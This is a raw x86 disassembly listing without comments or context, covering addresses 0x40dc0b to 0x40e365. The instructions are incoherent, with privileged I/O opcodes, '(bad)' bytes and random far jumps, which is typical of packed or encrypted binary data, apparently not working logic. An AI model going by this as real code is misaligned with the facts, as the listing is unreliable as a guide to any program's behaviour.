  40dc0b:	iret   
  40dc0c:	pop    es
  40dc0d:	out    dx,al
  40dc0e:	add    ecx,DWORD PTR ds:0x656c3d2e
  40dc14:	cmp    BYTE PTR [eax-0x64a34131],dh
  40dc1a:	adc    eax,0x2243dd48
  40dc1f:	jns    0x40dbbf
  40dc21:	xchg   BYTE PTR [esi+eiz*8],bh
  40dc24:	sbb    BYTE PTR [edi],dl
  40dc26:	mov    ds:0x6c4619c1,eax
  40dc2b:	lea    ebx,fs:[edx-0xc7c58f4]
  40dc32:	push   eax
  40dc33:	call   0x5386:0x95626ebf
  40dc3a:	or     eax,0x9f179633
  40dc3f:	or     BYTE PTR [eax-0x6a],bl
  40dc42:	sub    cl,ch
  40dc44:	or     eax,DWORD PTR [esp+eax*8]
  40dc47:	gs xchg esp,eax
  40dc49:	adc    eax,0xaac27ad5
  40dc4e:	arpl   WORD PTR [ebp-0x6c],si
  40dc51:	enter  0x1fcd,0x43
  40dc55:	loop   0x40dcc0
  40dc57:	push   ebx
  40dc58:	mov    esp,0x4b4c7de0
  40dc5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc5e:	bnd js 0x40dc70
  40dc61:	mov    edx,?
  40dc63:	push   edi
  40dc64:	inc    esp
  40dc65:	ins    DWORD PTR es:[edi],dx
  40dc66:	fst    st(7)
  40dc68:	sti    
  40dc69:	out    dx,eax
  40dc6a:	ins    DWORD PTR es:[edi],dx
  40dc6b:	or     ch,BYTE PTR ds:0xec294a6a
  40dc71:	mov    al,ds:0x3693e62
  40dc76:	cmc    
  40dc77:	rcr    ah,0x5b
  40dc7a:	adc    eax,0x842ccf3f
  40dc7f:	or     BYTE PTR ds:0x6b24c94c,dh
  40dc85:	lods   al,BYTE PTR ds:[esi]
  40dc86:	adc    al,0xa7
  40dc88:	mov    eax,0x84c8265
  40dc8d:	icebp  
  40dc8e:	int    0xa8
  40dc90:	dec    edx
  40dc91:	loopne 0x40dcd3
  40dc93:	out    dx,eax
  40dc94:	push   0xddf0dc98
  40dc99:	cmp    eax,0x396e9b2f
  40dc9e:	in     al,0x77
  40dca0:	push   edi
  40dca1:	xor    bh,BYTE PTR [edi+0x63]
  40dca4:	iret   
  40dca5:	sbb    eax,0x7b7eec0a
  40dcaa:	aaa    
  40dcab:	pop    eax
  40dcac:	add    al,0x13
  40dcae:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40dcb0:	cmc    
  40dcb1:	cli    
  40dcb2:	mov    eax,ds:0x36f2f61d
  40dcb7:	add    eax,0x4cb5a026
  40dcbc:	xchg   ebx,eax
  40dcbd:	das    
  40dcbe:	clc    
  40dcbf:	dec    DWORD PTR [ecx-0x28]
  40dcc2:	loopne 0x40dca9
  40dcc4:	aam    0x6f
  40dcc6:	out    dx,al
  40dcc7:	ret    0x8da9
  40dcca:	push   eax
  40dccb:	pop    ebx
  40dccc:	adc    bh,BYTE PTR [edx+0x1c]
  40dccf:	add    ch,BYTE PTR [ecx+0x4b400234]
  40dcd5:	mov    ds:0x6a67e0a1,eax
  40dcda:	adc    dh,BYTE PTR [ecx]
  40dcdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcdd:	add    ah,BYTE PTR [eax-0x21]
  40dce0:	xor    edi,DWORD PTR [eax-0x39]
  40dce3:	xchg   ebx,eax
  40dce4:	mov    fs,ebx
  40dce6:	inc    ebp
  40dce7:	jmp    0xd0a02f78
  40dcec:	(bad)  
  40dced:	push   eax
  40dcee:	and    eax,DWORD PTR [esi]
  40dcf0:	cmp    al,0x40
  40dcf2:	inc    esp
  40dcf3:	push   ss
  40dcf4:	mov    ds:0x6a84c347,al
  40dcf9:	hlt    
  40dcfa:	js     0x40dd54
  40dcfc:	push   cs
  40dcfd:	stos   DWORD PTR es:[edi],eax
  40dcfe:	int    0xb6
  40dd00:	stos   BYTE PTR es:[edi],al
  40dd01:	jp     0x40dd05
  40dd03:	nop
  40dd04:	cwde   
  40dd05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd06:	les    esi,FWORD PTR [ecx+ebx*4-0x692e0e30]
  40dd0d:	cld    
  40dd0e:	imul   eax,DWORD PTR [esi],0x5f
  40dd11:	mov    ecx,0xdca98e67
  40dd16:	sub    ebp,DWORD PTR [eax+edi*2]
  40dd19:	adc    al,0x57
  40dd1c:	lods   al,BYTE PTR ds:[esi]
  40dd1d:	pop    es
  40dd1e:	je     0x40dcbe
  40dd20:	push   esi
  40dd21:	and    ebp,DWORD PTR [eax]
  40dd23:	call   0x201094ea
  40dd28:	dec    esi
  40dd29:	loope  0x40dccb
  40dd2b:	mov    al,0x6e
  40dd2d:	inc    ecx
  40dd2e:	push   eax
  40dd2f:	jnp    0x40dcc4
  40dd31:	popa   
  40dd32:	bnd es jb 0x40dd9b
  40dd36:	fsubp  st(7),st
  40dd38:	pop    ecx
  40dd39:	stos   BYTE PTR es:[edi],al
  40dd3a:	xchg   DWORD PTR [eax],esp
  40dd3c:	xor    edx,DWORD PTR [ebx]
  40dd3e:	push   ds
  40dd3f:	loopne 0x40dcfd
  40dd41:	stc    
  40dd42:	test   BYTE PTR [eax+0x3a35c41c],bl
  40dd48:	into   
  40dd49:	adc    DWORD PTR [esi-0x1],ecx
  40dd4c:	jecxz  0x40dd16
  40dd4e:	out    dx,eax
  40dd4f:	jno    0x40dd24
  40dd51:	mov    ebx,0x51bfea12
  40dd56:	jne    0x40dd6b
  40dd58:	mov    dl,0xd
  40dd5a:	(bad)  
  40dd5b:	out    dx,eax
  40dd5c:	jg     0x40dd7b
  40dd5e:	push   ss
  40dd5f:	es xchg ebx,eax
  40dd61:	or     cl,BYTE PTR [eax-0x65]
  40dd64:	lds    edi,FWORD PTR [ecx+ebx*1+0x20761eb]
  40dd6b:	fisubr DWORD PTR [eax+0x3d]
  40dd6e:	mov    cl,0xd8
  40dd70:	ja     0x40dd99
  40dd72:	lds    eax,FWORD PTR ds:0x235a10be
  40dd78:	pop    esp
  40dd79:	mov    bl,dh
  40dd7b:	mov    al,ds:0x23e0ea0c
  40dd80:	push   edx
  40dd81:	fcom   DWORD PTR [esi+0x6b]
  40dd84:	fcom   QWORD PTR [esi+ebp*4]
  40dd87:	jae    0x40dd63
  40dd89:	lahf   
  40dd8a:	fnstcw WORD PTR [eax+0x3aeac03f]
  40dd90:	pusha  
  40dd91:	(bad)  
  40dd92:	shl    DWORD PTR [ebx+0x7e400fa8],1
  40dd98:	sbb    ah,BYTE PTR ds:0xc76d6b24
  40dd9e:	xor    DWORD PTR [ecx],edx
  40dda0:	dec    ecx
  40dda1:	push   edx
  40dda2:	dec    esi
  40dda3:	or     esp,DWORD PTR [edx+eiz*8]
  40dda6:	sti    
  40dda7:	xlat   BYTE PTR ds:[ebx]
  40dda8:	inc    edi
  40dda9:	mov    esi,0x64d12994
  40ddae:	push   ecx
  40ddaf:	push   edx
  40ddb0:	cmp    ecx,DWORD PTR [edx]
  40ddb2:	and    DWORD PTR ss:[edi-0x1279a14a],ebx
  40ddb9:	cmp    ebx,esi
  40ddbb:	(bad)  
  40ddbc:	jmp    0xfcfd:0x3997fb0b
  40ddc3:	mov    bh,BYTE PTR [eax-0x7246ee49]
  40ddc9:	adc    ax,WORD PTR [eax-0x5c5a728e]
  40ddd0:	push   esi
  40ddd1:	mov    WORD PTR [ebp-0xb],cs
  40ddd4:	inc    esi
  40ddd5:	arpl   WORD PTR [esi],si
  40ddd7:	xchg   ebp,eax
  40ddd8:	fistp  WORD PTR [eax-0x1eefa949]
  40ddde:	cs sub eax,0x8677a6f
  40dde4:	ja     0x40de3d
  40dde6:	ret    
  40dde7:	pop    esi
  40dde8:	and    BYTE PTR [edx*1-0x50904880],ch
  40ddef:	adc    ch,BYTE PTR [ecx+eax*4]
  40ddf2:	mov    eax,ds:0x283a71c9
  40ddf7:	stos   BYTE PTR es:[edi],al
  40ddf8:	shl    DWORD PTR [ebp+ecx*8+0x9],1
  40ddfc:	ret    
  40ddfd:	imul   edx,DWORD PTR [edx-0x428dedd4],0x60
  40de04:	push   esp
  40de05:	retf   
  40de06:	popa   
  40de07:	pop    ss
  40de08:	in     al,0x89
  40de0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de0b:	xor    DWORD PTR [ecx-0x1b],edi
  40de0e:	or     ah,bh
  40de10:	add    al,0xc8
  40de12:	retf   0xd6d5
  40de15:	lock rcr BYTE PTR [eax+0x7e],cl
  40de19:	pop    esp
  40de1a:	out    0xea,eax
  40de1c:	ficom  DWORD PTR [eax-0x9]
  40de1f:	and    BYTE PTR [ebx+0x3d14d89d],bh
  40de25:	dec    esi
  40de26:	cs int 0x2f
  40de29:	and    DWORD PTR [ebx],ecx
  40de2b:	in     eax,dx
  40de2c:	or     edx,0x340aaff7
  40de32:	sbb    ebx,0x7bed59ff
  40de38:	das    
  40de39:	(bad)  
  40de3a:	imul   esp,ebp,0xfffffffa
  40de3d:	lods   al,BYTE PTR ds:[esi]
  40de3e:	std    
  40de3f:	es or  ecx,ebx
  40de42:	mov    eax,ds:0x85bf0e51
  40de47:	ror    BYTE PTR [edx-0xb],1
  40de4a:	addr16 xchg ecx,eax
  40de4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de4d:	add    eax,0xa4a14451
  40de52:	daa    
  40de53:	pop    eax
  40de54:	das    
  40de55:	vmovlps xmm6,xmm5,QWORD PTR [edi]
  40de59:	xor    al,0x82
  40de5b:	addr16 or eax,0xffffff9e
  40de5f:	mov    ebp,0x4749e505
  40de64:	loopne 0x40de25
  40de66:	cs push 0x4e
  40de69:	loope  0x40de5f
  40de6b:	std    
  40de6c:	push   esp
  40de6d:	data16 mov BYTE PTR [ebx-0x5ba4c2d],ah
  40de74:	loopne 0x40de92
  40de76:	scas   eax,DWORD PTR es:[edi]
  40de77:	shl    DWORD PTR [eax-0x7b],1
  40de7a:	push   cs
  40de7b:	aad    0x70
  40de7d:	shl    DWORD PTR [edi+0x6d],cl
  40de80:	pop    ss
  40de81:	and    edi,DWORD PTR [eiz*8-0x74b635b2]
  40de88:	xchg   DWORD PTR [ebp+0x22],eax
  40de8b:	pushf  
  40de8c:	test   DWORD PTR [edi+0x2ab7d9e6],0x90f0c069
  40de96:	pop    ss
  40de97:	mov    gs,WORD PTR [ebx-0x49c7655b]
  40de9d:	sahf   
  40de9e:	adc    eax,0xb9f3af54
  40dea3:	arpl   WORD PTR ds:0x6502d207,bx
  40dea9:	lods   al,BYTE PTR ds:[esi]
  40deaa:	mov    ds:0x88211157,eax
  40deaf:	xchg   esi,eax
  40deb0:	inc    edx
  40deb1:	xchg   edx,eax
  40deb2:	int    0x32
  40deb4:	dec    eax
  40deb5:	lock dec ecx
  40deb7:	sub    ebp,DWORD PTR ds:0x72a95b52
  40debd:	cmp    BYTE PTR [ebp-0xc9c9b70],dl
  40dec3:	imul   esp,DWORD PTR [esi],0xc182130c
  40dec9:	aad    0xbd
  40decb:	dec    eax
  40decc:	xchg   edi,eax
  40decd:	and    DWORD PTR [esi-0xef427f2],esi
  40ded3:	test   edi,esp
  40ded5:	xchg   ecx,eax
  40ded6:	lahf   
  40ded7:	adc    eax,0x2bb37e3
  40dedc:	icebp  
  40dedd:	sub    eax,0xedc3075f
  40dee2:	lock popa 
  40dee4:	add    eax,0xf8efc7c4
  40dee9:	sbb    eax,0x63c1695e
  40deee:	inc    ebx
  40deef:	cmp    BYTE PTR [esi],dl
  40def1:	mov    bl,bl
  40def3:	call   0xe7e1:0xd3c14b43
  40defa:	sub    edx,esi
  40defc:	mov    ecx,0x2d3d4218
  40df01:	mul    DWORD PTR ds:0x77b432f4
  40df07:	or     dh,BYTE PTR ds:0xa7698cf
  40df0d:	pop    ebp
  40df0e:	dec    edx
  40df0f:	(bad)  
  40df11:	enter  0x8f24,0x30
  40df15:	imul   edi,DWORD PTR [eax+esi*4+0x3d6e977d],0x35ce0d9a
  40df20:	test   BYTE PTR cs:0x754ead34,al
  40df27:	jp     0x40df16
  40df29:	xchg   ebp,eax
  40df2a:	inc    esp
  40df2b:	retf   
  40df2c:	fsubr  QWORD PTR [edx]
  40df2e:	gs stos DWORD PTR es:[edi],eax
  40df30:	xor    BYTE PTR [edx-0x3445b0b],bh
  40df36:	add    dl,BYTE PTR [esp+edx*4+0x55c33146]
  40df3d:	sbb    al,0xd9
  40df3f:	js     0x40df67
  40df41:	stos   DWORD PTR es:[edi],eax
  40df42:	sub    dh,BYTE PTR [eax+0x50]
  40df45:	push   ss
  40df46:	jmp    0x40df35
  40df48:	xor    al,0xa7
  40df4a:	and    ebp,DWORD PTR [edx-0x7e992b75]
  40df50:	ss in  eax,dx
  40df52:	push   edx
  40df53:	and    BYTE PTR fs:[ebp+0x482e38ba],al
  40df5a:	dec    eax
  40df5b:	cwde   
  40df5c:	mov    bh,BYTE PTR [ecx]
  40df5e:	adc    bh,BYTE PTR [edx]
  40df60:	inc    ebx
  40df61:	icebp  
  40df62:	rcr    esi,0x3b
  40df65:	jecxz  0x40dfb2
  40df67:	inc    ecx
  40df68:	xchg   esp,eax
  40df69:	cwde   
  40df6a:	push   edx
  40df6b:	cmc    
  40df6c:	and    bl,bl
  40df6e:	test   BYTE PTR [ecx+ebp*4-0x4c131ff8],al
  40df75:	je     0x40df97
  40df77:	aad    0xb9
  40df79:	pop    ss
  40df7a:	repnz fistp WORD PTR fs:[ebx+0x57]
  40df7f:	pushf  
  40df80:	dec    ebx
  40df81:	push   ss
  40df82:	rcr    WORD PTR [ebp-0x78],0xf8
  40df87:	add    al,0xdd
  40df89:	sub    dl,BYTE PTR [esp+edi*8]
  40df8c:	sub    eax,0x9296cfc9
  40df91:	xlat   BYTE PTR ds:[ebx]
  40df92:	push   esp
  40df93:	ret    0xb911
  40df96:	dec    esi
  40df97:	scas   al,BYTE PTR es:[edi]
  40df98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df99:	rcr    cl,cl
  40df9b:	mov    esi,0xe4854f10
  40dfa0:	xchg   ecx,eax
  40dfa1:	fcomp  DWORD PTR [ecx]
  40dfa3:	jp     0x40df66
  40dfa5:	shl    BYTE PTR ds:0x3bdbc544,0xcf
  40dfac:	mov    ebp,0x68a8047e
  40dfb1:	out    dx,al
  40dfb2:	mov    edi,0xb9cf17c3
  40dfb7:	pop    eax
  40dfb8:	xchg   WORD PTR [esi+0x52],dx
  40dfbc:	push   0xa7f72281
  40dfc1:	(bad)  
  40dfc2:	aad    0xd8
  40dfc4:	mov    dl,0x1b
  40dfc6:	add    BYTE PTR [esi+0x3f],0xf0
  40dfca:	ja     0x40dfdc
  40dfcc:	ins    BYTE PTR es:[edi],dx
  40dfcd:	pop    esp
  40dfce:	sub    cl,dh
  40dfd0:	mov    DWORD PTR [eax-0x61],ebx
  40dfd3:	xchg   ebp,eax
  40dfd4:	push   cs
  40dfd5:	out    dx,al
  40dfd6:	jge    0x40e009
  40dfd8:	rol    ah,1
  40dfda:	cwde   
  40dfdb:	je     0x40dfa3
  40dfdd:	cmp    esi,edi
  40dfdf:	jl     0x40e02e
  40dfe1:	cli    
  40dfe2:	stos   BYTE PTR es:[edi],al
  40dfe3:	imul   ebp,esp,0x9546b9ab
  40dfe9:	and    BYTE PTR [bp+di+0x3a],ah
  40dfed:	inc    edi
  40dfee:	outs   dx,BYTE PTR ds:[esi]
  40dfef:	mov    bl,0x70
  40dff1:	mov    edi,0x76f91eb6
  40dff6:	pop    ecx
  40dff7:	aam    0x27
  40dff9:	in     eax,dx
  40dffa:	sub    ebp,DWORD PTR [eax-0x7547f454]
  40e000:	add    cl,BYTE PTR [ebp+ebx*2+0x9]
  40e004:	stos   BYTE PTR es:[edi],al
  40e005:	mov    al,BYTE PTR [edx+0x307aa16c]
  40e00b:	pop    edi
  40e00c:	push   es
  40e00d:	fild   QWORD PTR [edi]
  40e00f:	mov    bl,0xca
  40e011:	and    bh,BYTE PTR [ecx]
  40e013:	into   
  40e014:	fsubr  DWORD PTR [edx]
  40e016:	add    bh,BYTE PTR [edi]
  40e018:	add    dh,BYTE PTR [eax+0x43222366]
  40e01e:	pop    esi
  40e01f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e020:	sahf   
  40e021:	aaa    
  40e022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e023:	xor    BYTE PTR [ecx-0x7833c0c],ch
  40e029:	push   ds
  40e02a:	jle    0x40e04d
  40e02c:	push   0xffffff9a
  40e02e:	jb     0x40dffd
  40e030:	mov    ds:0xe4137b21,al
  40e035:	push   cs
  40e036:	xor    esi,DWORD PTR [ebp+ebx*8+0x4b]
  40e03a:	inc    edi
  40e03b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e03c:	pushf  
  40e03d:	push   sp
  40e03f:	cwde   
  40e040:	inc    ebx
  40e041:	aad    0x27
  40e043:	out    0x62,al
  40e045:	or     ch,BYTE PTR [ecx-0x4d]
  40e048:	add    eax,ebp
  40e04a:	hlt    
  40e04b:	(bad)  
  40e04d:	cli    
  40e04e:	cmp    al,0xed
  40e050:	jb     0x40dff3
  40e052:	out    dx,eax
  40e053:	jbe    0x40e0b5
  40e055:	sahf   
  40e056:	cs inc esi
  40e058:	sahf   
  40e059:	dec    BYTE PTR [esi-0x74]
  40e05c:	js     0x40e06a
  40e05e:	mov    al,0xe
  40e060:	add    edx,DWORD PTR [edi-0x35]
  40e063:	add    eax,0xba027968
  40e068:	inc    edx
  40e069:	jb     0x40e004
  40e06b:	ret    0x4a59
  40e06e:	fs sub eax,ebx
  40e071:	fsub   QWORD PTR [ecx-0x624974]
  40e077:	xor    ebp,DWORD PTR [edi]
  40e079:	cmp    esi,DWORD PTR [eax+0x5d]
  40e07c:	test   BYTE PTR [edx-0x50],0xf5
  40e080:	repz in al,0x20
  40e083:	popf   
  40e084:	test   DWORD PTR [edx+edi*4-0x49d76f53],ebx
  40e08b:	push   ecx
  40e08c:	inc    eax
  40e08d:	ss sar DWORD PTR ds:[edx],cl
  40e091:	nop
  40e092:	pop    ecx
  40e093:	sub    eax,0xc68c8d5d
  40e098:	icebp  
  40e099:	inc    esi
  40e09a:	bound  ebp,QWORD PTR [ebx]
  40e09c:	les    edx,FWORD PTR [esi-0x7a7fb251]
  40e0a2:	sbb    edi,ecx
  40e0a4:	fst    QWORD PTR [esi]
  40e0a6:	push   esi
  40e0a7:	vmovntpd YMMWORD PTR [esi-0x50],ymm6
  40e0ac:	push   0xffffffb3
  40e0ae:	push   ds
  40e0af:	mov    edx,0xaf04936c
  40e0b4:	call   0xa114:0x2d793cfa
  40e0bb:	mov    ebx,0x3c142a5e
  40e0c0:	adc    BYTE PTR [ebp-0x65],bh
  40e0c3:	in     al,0x5d
  40e0c5:	stos   DWORD PTR es:[edi],eax
  40e0c6:	out    0x93,al
  40e0c8:	ds pop ss
  40e0ca:	mov    edx,0xd0c4fb5f
  40e0cf:	rcr    BYTE PTR [ecx+edx*8],0xf9
  40e0d3:	mov    eax,ds:0x45978624
  40e0d8:	sub    edx,ebx
  40e0da:	clc    
  40e0db:	pop    es
  40e0dc:	jmp    0xbaa6:0x113fd2e
  40e0e3:	and    eax,ecx
  40e0e5:	inc    esi
  40e0e6:	jg     0x40e0f7
  40e0e8:	repz arpl sp,sp
  40e0eb:	enter  0x490c,0x16
  40e0ef:	dec    esi
  40e0f0:	dec    esp
  40e0f1:	loopne 0x40e0a5
  40e0f3:	inc    edi
  40e0f4:	out    0x48,eax
  40e0f6:	lods   al,BYTE PTR ds:[esi]
  40e0f7:	dec    edi
  40e0f8:	fldenv [eax]
  40e0fa:	lock jne 0x40e0a2
  40e0fd:	pop    edi
  40e0fe:	add    al,BYTE PTR [esi-0x24]
  40e101:	adc    BYTE PTR [ecx+eiz*8],ah
  40e104:	xchg   BYTE PTR [ebp-0x5f],ch
  40e107:	sbb    bh,BYTE PTR [edi-0x5aa3407f]
  40e10d:	mul    edi
  40e10f:	and    DWORD PTR [ecx+0x7357cdcf],esp
  40e115:	fwait
  40e116:	inc    ecx
  40e117:	xchg   ebp,eax
  40e118:	stos   BYTE PTR es:[edi],al
  40e119:	inc    edi
  40e11a:	aaa    
  40e11b:	xlat   BYTE PTR ds:[ebx]
  40e11c:	outs   dx,BYTE PTR ds:[esi]
  40e11d:	sbb    eax,0x579def87
  40e122:	xlat   BYTE PTR ds:[ebx]
  40e123:	dec    ecx
  40e124:	and    DWORD PTR [edx],edi
  40e126:	inc    esi
  40e127:	add    DWORD PTR [edi-0x4d541d3c],esi
  40e12d:	xchg   DWORD PTR [eax],ebp
  40e12f:	scas   al,BYTE PTR es:[edi]
  40e130:	xchg   edx,eax
  40e131:	adc    BYTE PTR [ebx],dh
  40e133:	dec    edi
  40e134:	mov    cs,WORD PTR [ebx+0x5ee99e47]
  40e13a:	xor    eax,0x8ae3e2a2
  40e13f:	sar    DWORD PTR [ebp+0x5cd6657f],cl
  40e145:	ret    
  40e146:	cmp    BYTE PTR [ecx-0x67c73781],cl
  40e14c:	xlat   BYTE PTR ds:[ebx]
  40e14d:	mov    dl,0x12
  40e14f:	sbb    eax,0x5f4ca45a
  40e154:	xchg   DWORD PTR [ebx-0x7c],edi
  40e157:	test   al,0x51
  40e159:	test   al,0x47
  40e15b:	or     edi,esi
  40e15d:	cmp    dh,BYTE PTR [ecx+0x55fc1d01]
  40e163:	cmp    edi,DWORD PTR [ecx+0x71fd14ac]
  40e169:	adc    BYTE PTR [edi-0x37b3d640],al
  40e16f:	sub    DWORD PTR [eax-0x46],esp
  40e172:	xchg   esi,eax
  40e173:	sbb    BYTE PTR [esi],0xb3
  40e176:	xchg   ecx,eax
  40e177:	jmp    FWORD PTR [eax-0x17]
  40e17a:	in     al,0xec
  40e17c:	pushf  
  40e17d:	data16 or dh,BYTE PTR [esi]
  40e180:	lods   eax,DWORD PTR ds:[esi]
  40e181:	aaa    
  40e182:	pop    eax
  40e183:	mov    dh,0x61
  40e185:	sbb    bl,dh
  40e187:	das    
  40e188:	ins    BYTE PTR es:[edi],dx
  40e189:	push   ds
  40e18a:	xor    al,0xd3
  40e18c:	loope  0x40e161
  40e18e:	pop    ebx
  40e18f:	daa    
  40e190:	retf   
  40e191:	mov    esi,DWORD PTR [ebx+0x1a6c40d9]
  40e197:	lock mov esp,0xd460d202
  40e19d:	adc    eax,0xf35c91bf
  40e1a2:	mov    ah,0x32
  40e1a4:	pop    eax
  40e1a5:	es xchg esi,eax
  40e1a7:	daa    
  40e1a8:	les    edi,FWORD PTR [edx-0x79]
  40e1ab:	mov    ah,0x56
  40e1ad:	shr    DWORD PTR [esp+ebx*1+0xd6183f4],1
  40e1b4:	out    0xba,al
  40e1b6:	pop    es
  40e1b7:	int    0xb6
  40e1b9:	leave  
  40e1ba:	or     BYTE PTR [edi],dh
  40e1bc:	fdiv   QWORD PTR [ebp+0x60]
  40e1bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1c0:	loope  0x40e1f2
  40e1c2:	cli    
  40e1c3:	push   edx
  40e1c4:	in     eax,0xc9
  40e1c6:	xor    eax,DWORD PTR [ebx+0x51]
  40e1c9:	sbb    eax,0x13b8a896
  40e1ce:	mov    ebp,0x4524c14d
  40e1d3:	inc    esp
  40e1d4:	inc    edi
  40e1d5:	fs pusha 
  40e1d7:	mov    eax,0x1a77e1a5
  40e1dc:	inc    esp
  40e1dd:	xchg   BYTE PTR [edi],cl
  40e1df:	xor    BYTE PTR [ebp+ecx*4+0x2c803987],ah
  40e1e6:	call   0xe6cf46c
  40e1eb:	out    dx,al
  40e1ec:	push   esi
  40e1ed:	ins    BYTE PTR es:[edi],dx
  40e1ee:	inc    ecx
  40e1ef:	imul   ecx,DWORD PTR [ebp+0x104947c6],0xffffffb5
  40e1f6:	jo     0x40e1b1
  40e1f8:	arpl   ax,di
  40e1fa:	mov    dl,0xc5
  40e1fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1fd:	pop    es
  40e1fe:	sub    eax,ecx
  40e200:	pop    edi
  40e201:	sbb    eax,0x54c44f0a
  40e206:	fdiv   QWORD PTR [edi-0x70c8ecc9]
  40e20c:	sub    ch,BYTE PTR [edi+0x21]
  40e20f:	int    0x3f
  40e211:	pop    ebx
  40e212:	jno    0x40e19f
  40e214:	jns    0x40e253
  40e216:	dec    esi
  40e217:	out    dx,eax
  40e218:	push   es
  40e219:	sbb    DWORD PTR [edi+0x21367e],edx
  40e21f:	fist   DWORD PTR [ecx]
  40e221:	mov    eax,0xb2de3d80
  40e226:	xor    BYTE PTR [edi],al
  40e228:	sbb    DWORD PTR ds:0x2868b150,ebp
  40e22e:	add    eax,DWORD PTR [ebp+0x1e723bdd]
  40e234:	jg     0x40e2af
  40e236:	push   ss
  40e237:	jno    0x40e1dd
  40e239:	push   ebp
  40e23a:	mov    WORD PTR [eax+0x2],gs
  40e23d:	jmp    0x4ac7:0x8cead80f
  40e244:	int    0x57
  40e246:	mov    BYTE PTR [edi+0x68],dl
  40e249:	xor    bh,bh
  40e24b:	xor    al,BYTE PTR [ebp-0x28]
  40e24e:	test   BYTE PTR [ecx+0x38f13a09],cl
  40e254:	(bad)  
  40e255:	push   eax
  40e256:	jmp    0x40e20c
  40e258:	cmp    al,0x87
  40e25a:	idiv   ebx
  40e25c:	mov    bh,0x67
  40e25e:	imul   ebp,edx,0xdc4e319
  40e264:	or     edi,DWORD PTR [ebp-0x7588b6e9]
  40e26a:	jbe    0x40e242
  40e26c:	xchg   DWORD PTR [ebx-0x24],eax
  40e26f:	lea    ebp,ds:0x627fb9ed
  40e275:	aas    
  40e276:	(bad)  
  40e277:	push   ebx
  40e278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e279:	pop    edx
  40e27a:	mov    BYTE PTR [edx+0x7126849c],al
  40e280:	jnp    0x40e2d7
  40e282:	mov    esi,0x7dec6e21
  40e287:	xchg   ebp,eax
  40e288:	and    al,0x45
  40e28a:	scas   al,BYTE PTR es:[edi]
  40e28b:	mov    ebx,0x5c7f705b
  40e290:	call   0x73f6:0x364eccd5
  40e297:	data16 int 0x3b
  40e29a:	dec    esi
  40e29b:	xor    BYTE PTR [ebp+ebx*1-0x3b],0x17
  40e2a0:	xor    eax,DWORD PTR ss:[esi-0x362ccbe3]
  40e2a7:	add    dh,BYTE PTR [esi-0x3b]
  40e2aa:	pusha  
  40e2ab:	lods   al,BYTE PTR ds:[esi]
  40e2ac:	cmp    esi,esi
  40e2ae:	test   al,0xe6
  40e2b0:	sub    BYTE PTR [ecx+0x1],ah
  40e2b3:	popf   
  40e2b4:	and    dl,BYTE PTR [edi]
  40e2b6:	xchg   edx,eax
  40e2b7:	inc    ebx
  40e2b8:	aam    0xd1
  40e2ba:	adc    ebp,ebx
  40e2bc:	push   ss
  40e2bd:	mov    al,dl
  40e2bf:	and    DWORD PTR [ecx],ebx
  40e2c1:	mov    BYTE PTR [ebx+0x2d3759ea],dl
  40e2c7:	or     DWORD PTR [ecx+0x6f],edx
  40e2ca:	add    DWORD PTR [ecx],ecx
  40e2cc:	sbb    cl,BYTE PTR [eax]
  40e2ce:	mov    ds:0xf55499cc,al
  40e2d3:	and    ebp,DWORD PTR [ebx+0x241adb42]
  40e2d9:	js     0x40e317
  40e2db:	xchg   esi,eax
  40e2dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2de:	aam    0x3f
  40e2e0:	aaa    
  40e2e1:	push   es
  40e2e2:	push   ss
  40e2e3:	int3   
  40e2e4:	sub    al,ch
  40e2e6:	adc    bl,BYTE PTR [esi]
  40e2e8:	mov    ebx,0x4e02cb3c
  40e2ed:	dec    edi
  40e2ee:	push   0x4e
  40e2f0:	(bad)  
  40e2f1:	pop    esp
  40e2f2:	sti    
  40e2f3:	xchg   edx,eax
  40e2f4:	dec    ebp
  40e2f5:	retf   0xd44a
  40e2f8:	fwait
  40e2f9:	pop    ds
  40e2fa:	jne    0x40e2e6
  40e2fc:	int    0xd6
  40e2fe:	(bad)  
  40e2ff:	bound  ebx,QWORD PTR [edx-0x5eeab79c]
  40e305:	inc    edi
  40e306:	xor    eax,0x78319272
  40e30b:	sub    eax,0xfcd97b0c
  40e310:	jns    0x40e337
  40e312:	ror    BYTE PTR [esi-0x61],0x4b
  40e316:	je     0x40e367
  40e318:	push   0xffffffac
  40e31a:	outs   dx,BYTE PTR ds:[esi]
  40e31b:	xor    bl,BYTE PTR [esi+eiz*4]
  40e31e:	cmp    DWORD PTR [ebx-0xb2b5f8b],0x26ecc7cf
  40e328:	(bad)  
  40e329:	es push ebx
  40e32b:	sbb    dl,BYTE PTR ds:0x2f32e162
  40e331:	add    al,BYTE PTR [ebp-0x43]
  40e334:	retf   0xdd28
  40e337:	mov    WORD PTR [edi+ebp*4],fs
  40e33a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e33b:	int3   
  40e33c:	inc    ebx
  40e33d:	aas    
  40e33e:	xchg   esi,eax
  40e33f:	std    
  40e340:	pop    edx
  40e341:	jg     0x40e37c
  40e343:	sub    DWORD PTR [esi-0x64],esi
  40e346:	dec    edx
  40e347:	jns    0x40e36e
  40e349:	adc    edx,edi
  40e34b:	pusha  
  40e34c:	inc    eax
  40e34d:	test   BYTE PTR [edi],ah
  40e34f:	add    BYTE PTR [edi+0x7a],0xb
  40e353:	aad    0xd2
  40e355:	lds    eax,FWORD PTR [edi]
  40e357:	aas    
  40e358:	retf   0xfca5
  40e35b:	cdq    
  40e35c:	pop    ecx
  40e35d:	xchg   edi,eax
  40e35e:	(bad)  
  40e35f:	cld    
  40e360:	cmp    dh,BYTE PTR [ebx+0x1]
  40e363:	je     0x40e38e
  40e365:	or     BYTE PTR [edi],ch
